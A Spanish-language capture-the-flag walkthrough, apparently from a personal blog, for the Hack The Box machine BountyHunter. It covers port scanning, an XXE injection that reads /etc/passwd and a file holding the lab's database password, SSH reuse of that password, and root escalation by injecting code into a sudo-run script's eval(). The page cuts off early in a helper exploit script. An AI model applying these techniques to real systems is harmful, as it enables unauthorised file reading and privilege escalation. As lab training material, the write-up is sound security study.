<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BountyHunter Writeup [ES] - HackTheBox" /><meta property="og:locale" content="en" /><meta name="description" content="BountyHunter es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla." /><meta property="og:description" content="BountyHunter es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla." /><link rel="canonical" href="https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/" /><meta property="og:url" content="https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-26T17:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="BountyHunter Writeup [ES] - HackTheBox" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-11-26T17:00:00-03:00","datePublished":"2021-11-26T17:00:00-03:00","description":"BountyHunter es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.","headline":"BountyHunter Writeup [ES] - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/"},"url":"https://brsalcedom.github.io/BountyHunter-Writeup-HackTheBox/"}</script><title>BountyHunter Writeup [ES] - HackTheBox | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>BountyHunter Writeup [ES] - HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>BountyHunter Writeup [ES] - HackTheBox</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1637956800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-11-26 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1843 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://app.hackthebox.com/machines/359">BountyHunter</a> es una máquina <strong>Linux</strong> de dificultad fácil ofrecida por la plataforma de <a href="https://app.hackthebox.com/">Hack The Box</a>. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.</p><h2 id="información"><span class="mr-2">Información</span><a href="#información" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/HTB/BountyHunter/01-info.png" alt="Info" data-proofer-ignore></p><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Como siempre, se iniciará realizando un escaneo general de los 65535 puertos.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -p- -sS --min-rate 4000 -n -v -oG allPorts.gnmap 10.10.11.100</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 01:12 -03
Initiating SYN Stealth Scan at 01:12
Scanning 10.10.11.100 [65535 ports]
Discovered open port 22/tcp on 10.10.11.100
Discovered open port 80/tcp on 10.10.11.100
Completed SYN Stealth Scan at 01:13, 23.87s elapsed (65535 total ports)
Nmap scan report for 10.10.11.100
Host is up (0.15s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.23 seconds
</pre></table></code></div></div><p>Posteriormente se realiza un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -sC -sV -p22,80 -n -oN ports.nmap 10.10.11.100</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.11.100
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><ul><li>Resumen puertos</ul><div class="table-wrapper"><table><thead><tr><th>Puerto<th>Estado<th>Servicio<tbody><tr><td>22/tcp<td>Abierto<td>OpenSSH 8.2p1 - Ubuntu<tr><td>80/tcp<td>Abierto<td>Apache httpd 2.4.41</table></div><h3 id="enumeración-web"><span class="mr-2">Enumeración web</span><a href="#enumeración-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Lo primero que se visualiza al apuntar a la IP de la máquina, es una página web simple que simula ser una empresa de pentesting.</p><p><img data-src="/images/HTB/BountyHunter/05-web-home.png" alt="" data-proofer-ignore></p><p>En el menú se encuentra un acceso que parece interesante.</p><p><img data-src="/images/HTB/BountyHunter/10-portal.png" alt="" data-proofer-ignore></p><p>El enlace <strong>Portal</strong> redirige hacia el recurso <code class="language-plaintext highlighter-rouge">portal.php</code> que a su vez indica otro enlace para testear un sistema para registrar bountys.</p><p><img data-src="/images/HTB/BountyHunter/15-portal-redirect.png" alt="" data-proofer-ignore></p><p>Siguiendo el enlace se llega a <code class="language-plaintext highlighter-rouge">log_submit.php</code>, el cual es un formulario que permite ingresar cuatro valores para catalogar un bounty.</p><p><img data-src="/images/HTB/BountyHunter/20-bounty-report-1.png" alt="" data-proofer-ignore></p><p>Lo primero en este caso es verificar si este formulario es vulnerable a <code class="language-plaintext highlighter-rouge">xss</code> o <code class="language-plaintext highlighter-rouge">sqli</code>, pero después de intentar un momento, se verifica que no lo es.</p><p>Al darle a <strong>submit</strong>, entrega una vista previa de “como se ingresaría a la base de datos” si el sistema estuviera listo.</p><p><img data-src="/images/HTB/BountyHunter/25-bounty-report-2.png" alt="" data-proofer-ignore></p><p>Verificando el código fuente, se identifica que la web llama a un recurso <strong>javascript</strong> llamado <code class="language-plaintext highlighter-rouge">bountylog.js</code>.</p><p><img data-src="/images/HTB/BountyHunter/27-bountylog.js.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/BountyHunter/28-bountylog.js-content.png" alt="" data-proofer-ignore></p><p>Dentro se visualiza como se ejecuta una petición de tipo <strong>POST</strong> hacia la url <code class="language-plaintext highlighter-rouge">tracker_diRbPr00f314.php</code> y antes de emitirla, la pasa por la función btoa, la cual se encarga de encodear en <strong>base64</strong> la data.</p><p><img data-src="/images/HTB/BountyHunter/29-btoa.png" alt="" data-proofer-ignore></p><p>Siguiendo adelante, lo más cómodo es interceptar la petición con <strong>Burp Suite</strong> y validamos que efectivamente, la data viaja encodeada en <strong>base64</strong> y <strong>urlencode</strong>.</p><p><img data-src="/images/HTB/BountyHunter/30-burp-suite.png" alt="" data-proofer-ignore></p><p>Utilizando el decoder nativo de Burp, se puede reversar la string para obtener su valor, lo cual muestra un formato tipo <strong>xml</strong> en donde viaja lo ingresado en el formulario anterior.</p><p><img data-src="/images/HTB/BountyHunter/35-burp-xml.png" alt="" data-proofer-ignore></p><p>Sabiendo esto, es posible pensar que sea vulnerable a inyecciones <strong>XXE</strong>. Bajo esta base, se prueba intentar listar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> creando la entidad <strong>xxe</strong> e inyectándola en el campo title.</p><p><img data-src="/images/HTB/BountyHunter/40-xxe.png" alt="" data-proofer-ignore></p><p>Al darle <strong>send</strong> desde el repeater de Burp, se obtiene una respuesta en blanco, por lo que seguramente el sistema espera que se envíe la consulta encodeada.</p><p><img data-src="/images/HTB/BountyHunter/50-xxe-passwd.png" alt="" data-proofer-ignore></p><p>Efectivamente al realizar el encode <strong>base64</strong> + <strong>urlencode</strong> se obtiene capacidad de leer archivos locales de la máquina.</p><h2 id="ganando-acceso"><span class="mr-2">Ganando acceso</span><a href="#ganando-acceso" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Para este caso he desarrollado un pequeño <strong>script</strong> en python3<sup id="fnref:script" role="doc-noteref"><a href="#fn:script" class="footnote" rel="footnote">1</a></sup> que permite leer archivos locales utilizando dos modos:</p><ul><li><strong>file</strong>: Permite leer archivos locales.<li><strong>wrapper</strong>: Permite utilizar el wrapper PHP para obtener el código de un archivo en base64.</ul><p>La utilización del script es como se muestra a continuación.</p><ul><li><code class="language-plaintext highlighter-rouge">python3 xxe.py &lt;mode&gt; &lt;file&gt;</code></ul><p><img data-src="/images/HTB/BountyHunter/60-python-script-passwd.png" alt="" data-proofer-ignore></p><p>De esta forma se obtiene el resultado desde consola y se automatiza el encoding para avanzar más rápido en la extracción de información.</p><p>Se obtiene un usuario potencial: <code class="language-plaintext highlighter-rouge">development</code> que posee una consola tipo <strong>bash</strong>. Ahora solo restaría conseguir una contraseña para intentar una autenticación contra el servicio <strong>SSH</strong> que se encontraba expuesto.</p><p>Continuando con la enumeración web, se lanza un fuzzing con <strong>gobuster</strong> para detectar posibles recursos interesantes en <strong>php</strong>.</p><ul><li><code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -x "php,html,txt" -t 100 --no-error</code></ul><p><img data-src="/images/HTB/BountyHunter/62-db.php.png" alt="" data-proofer-ignore></p><p>Se encuentra un archivo llamado <code class="language-plaintext highlighter-rouge">db.php</code> que se encuentra en la raíz de la web. Al utilizar nuestro script <code class="language-plaintext highlighter-rouge">xxe.py</code> con el modo <strong>wrapper</strong> para encodearlo en base64, se obtiene la siguiente string.</p><p><img data-src="/images/HTB/BountyHunter/65-python-script-wrapper-db.php.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
</pre></table></code></div></div><p>al decodificarla se obtienen credenciales para una base de datos.</p><p><img data-src="/images/HTB/BountyHunter/68-db.php-content.png" alt="" data-proofer-ignore></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">// TODO -&gt; Implement login system with the database.</span>
<span class="nv">$dbserver</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"bounty"</span><span class="p">;</span>
<span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
<span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s2">"m19RoAU0hP41A1sTsq6K"</span><span class="p">;</span>
<span class="nv">$testuser</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Ahora que se tienen credenciales, se pueden testear contra el servicio SSH.</p><p><img data-src="/images/HTB/BountyHunter/80-development-ssh.png" alt="" data-proofer-ignore></p><p>Y resultan ser válidas para el usuario <strong>development</strong>. Ahora solo resta buscar una vía para escalar privilegios.</p><h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/HTB/BountyHunter/85-ls-la.png" alt="" data-proofer-ignore></p><p>Al leer archivos del home se visualiza la <em>flag</em> y un archivo llamado <code class="language-plaintext highlighter-rouge">contract.txt</code> que pone lo siguiente.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
</pre></table></code></div></div><p>Dentro del texto hay una sección en particular donde habla de que se han seteados los permisos correctos para la validación de tickets. Esto inmediatamente nos hace pensar en que nuestro user contiene permisos especiales seteados a nivel de sudo.</p><p><img data-src="/images/HTB/BountyHunter/90-sudo-l.png" alt="" data-proofer-ignore></p><p>Esto nos dice que podemos ejecutar como <strong>root</strong> y utlizando <strong>python3.8</strong> el script <code class="language-plaintext highlighter-rouge">ticketValidator.py</code>. En este caso todas las rutas se están llamando desde su path absoluto y el script es de propiedad de root, por lo que no es posible editarlo y <code class="language-plaintext highlighter-rouge">Path Hijacking</code> está descartado.</p><p>Validando el interior del script, se verifica que no importa librerías, por lo que tampoco podríamos pensar en un <strong>Library Hijacking</strong></p><p><img data-src="/images/HTB/BountyHunter/95-head-validator.py.png" alt="" data-proofer-ignore></p><p>Volviendo atrás, el archivo <code class="language-plaintext highlighter-rouge">contracts.txt</code> indicaba que los tickets estaban fallando en pasar la validación, esto nos hace pensar que pueden existir tickets rechazados. Dando un vistazo rápido al script <code class="language-plaintext highlighter-rouge">ticketValidator.py</code> vemos que lee archivos con extensión <code class="language-plaintext highlighter-rouge">.md</code> para su posterior análisis.</p><p>Con esto, al utilizar find, encontramos unos cuantos que han sido rechazados.</p><p><img data-src="/images/HTB/BountyHunter/100-tickets.png" alt="" data-proofer-ignore></p><p>Al ejecutar el script, nos solicitará indicar la ruta de un “ticket” para su evaluación. Le proporcionaremos uno de los encontrados anteriormente.</p><p><img data-src="/images/HTB/BountyHunter/105-tickets-2.png" alt="" data-proofer-ignore></p><p>Y nos responde indicando el destino y posteriormente que es inválido.</p><p>Bajo estas circunstancias solo restaría leer el script completo para averiguar que validaciones se están realizando y encontrar posibles vulnerabilidades que se puedan explotar.</p><ul><li><code class="language-plaintext highlighter-rouge">ticketValidator.py</code></ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for ireggularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="si">:</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>
            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>

<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Leyendo con detención el script, vemos que realiza una serie de validaciones a los “tickets” para evaluar si son validos o no. Además de esto, en una porción del código realiza un <code class="language-plaintext highlighter-rouge">eval()</code> de una línea en particular, por lo que nos interesa que el “ticket” pase las validaciones para que llegados a este punto, sea posible inyectar comandos.</p><p>Las validaciones que hace son las siguientes:</p><ol><li>Valida que el archivo tenga extensión <code class="language-plaintext highlighter-rouge">.md</code><li>Que comience por la cadena <code class="language-plaintext highlighter-rouge"># Skytrain Inc</code> en la primera línea.<li>Que comience por la cadena <code class="language-plaintext highlighter-rouge">## Ticket to</code> en la segunda línea.<li>Que comience por la cadena <code class="language-plaintext highlighter-rouge">__Ticket Code:__</code> en la tercera línea.<li>Que comience por la cadena <code class="language-plaintext highlighter-rouge">**</code> en su cuarta línea.<li>Que el número seguido de <code class="language-plaintext highlighter-rouge">**</code> y delimitado por un <code class="language-plaintext highlighter-rouge">+</code> sea divisible por <code class="language-plaintext highlighter-rouge">7</code> y arroje como resto <code class="language-plaintext highlighter-rouge">4</code>.</ol><p>Cumpliendo con estas condiciones, el archivo .md llegará hasta la sentencia <code class="language-plaintext highlighter-rouge">eval()</code> en donde se podría intentar inyectar código para su ejecución con altos privilegios.</p><p>Sabiendo lo anterior, podríamos construir un archivo con este contenido:</p><ul><li><code class="language-plaintext highlighter-rouge">test.md</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre># Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**46+410
</pre></table></code></div></div><p><img data-src="/images/HTB/BountyHunter/110-valid-ticket.png" alt="" data-proofer-ignore></p><p>Y efectivamente nuestro ticket pasó las verificaciones y ya es válido. Esto quiere decir que pasó por el <code class="language-plaintext highlighter-rouge">eval()</code> del código y ahora es tiempo para inyectar el comando que nos interesa. Para hacerlo es muy sencillo, solo se debe agregar un <code class="language-plaintext highlighter-rouge">and</code> luego de la operación matemática e importar la librería <code class="language-plaintext highlighter-rouge">os</code> para ejecutar una <strong>bash</strong>.</p><p><img data-src="/images/HTB/BountyHunter/120-payload-ticket.png" alt="" data-proofer-ignore></p><p>Al momento de ejecutarse de nuevo y pasar por el <code class="language-plaintext highlighter-rouge">eval()</code> se ejecuta arbitraríamente el comando y ya se obtiene una consola como root.</p><h2 id="recursos"><span class="mr-2">Recursos</span><a href="#recursos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div file="xxe.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="xxe.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre><span class="c1">#/usr/bin/python3
# Author: Cervant (https://brsalcedom.github.io)
</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span><span class="p">,</span> <span class="n">cprint</span>
